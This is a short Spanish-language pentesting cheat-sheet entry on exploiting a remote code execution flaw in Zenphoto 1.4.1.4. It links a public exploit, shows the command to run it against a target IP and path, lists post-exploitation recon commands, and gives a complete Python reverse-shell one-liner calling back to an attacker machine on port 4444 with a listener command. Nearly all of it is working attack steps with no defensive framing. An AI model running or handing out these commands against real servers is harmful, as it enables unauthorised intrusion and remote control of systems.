# ZenPhoto 

Tags: #Linux #Zenphoto 

Zenphoto es una galería de fotos y CMS (Content Management System) de código abierto.

## Zenphoto versión 1.4.1.4 - RCE

* [RCE](https://www.exploit-db.com/exploits/18083)

```bash
# La versión se puede obtener con 'Crtl + U' para inspeccionar el contenido html de la página y filtrando por 'version' 
 
❯ php rce.php <IP> /test/
	# IP       = Es la IP del server 
	# /test/   = Es el directorio donde se encuentra la aplicación de Zenphoto

# Comandos dentro de la shell 
	❯ whoami;id;hostname;uname -a
	❯ ls

# Esta shell NO es una shell interactiva real, por lo que se debe de hacer una shell interactiva de la siguiente manera:
	❯ python --version      # Verificar si python esta instalado 
	❯ ls /usr/bin/python*   # Mirar los interpretes de Python 
	❯ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_Kali",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

```bash 
❯ penelope -p 4444   # Recibir laa revershell en Kali 
```